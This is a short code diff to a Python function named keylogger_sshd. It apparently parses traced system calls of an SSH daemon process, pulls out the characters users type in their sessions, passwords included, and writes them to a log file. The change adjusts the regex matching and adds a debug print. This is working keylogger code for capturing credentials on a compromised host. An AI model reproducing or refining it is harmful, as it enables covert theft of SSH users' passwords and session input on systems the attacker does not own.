@@ -91,13 +91,15 @@ def keylogger_sshd(proc):
             logfd.close()
             break
 
-        if "read(" in output and ", 16384)" in output:
-            strokes = re.sub(r'write\(.*, "(.*)", 16384\).*= 1', r'\1', output)
+        if "write(" in output and ", 1)" in output:
+            strokes = re.sub(r'write\(.*, "(.*)", 1\).*= 1', r'\1', output)
             strokes = strokes.rstrip('\n') 
             
             strokes = replaceSpecial(strokes)
             strokes = strokes.encode().decode('unicode_escape')
-            
+           
+            print("[DEBUG] ", strokes)  
+
             logfd.write(strokes)
 
 """
